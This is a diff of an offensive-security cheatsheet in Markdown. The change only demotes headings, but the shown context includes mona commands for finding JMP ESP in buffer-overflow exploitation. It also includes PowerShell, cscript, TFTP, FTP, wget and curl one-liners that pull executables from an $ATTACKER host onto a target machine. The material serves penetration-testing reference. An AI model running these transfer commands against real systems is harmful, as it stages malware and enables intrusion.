@@ -118,13 +118,13 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 
 ### Binary Exploitation with ImmunityDebugger
 
-#### Get Loaded Modules
+##### Get Loaded Modules
 ```
 # We're interested in modules without protection, Read & Execute permissions
 !mona modules
 ```
 
-#### Finding JMP ESP Address
+##### Finding JMP ESP Address
 ```
 !mona find -s "\xFF\xE4" -m moduleName
 ```
@@ -143,7 +143,7 @@ php -S 0.0.0.0:80
 
 ### Uploading Files to Target Machine
 
-#### TFTP
+##### TFTP
 ```bash
 #tftp; Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
 service atftpd start
@@ -152,7 +152,7 @@ service atftpd start
 tftp -i $ATTACKER get /download/location/file /save/location/file
 ```
 
-#### FTP
+##### FTP
 ```bash
 # Linux: set up ftp server with anonymous logon access;
 twistd -n ftp -p 21 -r /file/to/serve
@@ -168,18 +168,18 @@ ftp -s:ftp-commands.txt
 ```
 
 
-#### HTTP: Poweshell
+##### HTTP: Poweshell
 ```PowerShell
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
 powershell.exe -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'}"
 ```
-#### HTTP: VBScript
+##### HTTP: VBScript
 Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
 ```
 cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
 ```
 
-#### HTTP: Linux
+##### HTTP: Linux
 ```bash
 wget http://$ATTACKER/file
 curl http://$ATTACKER/file
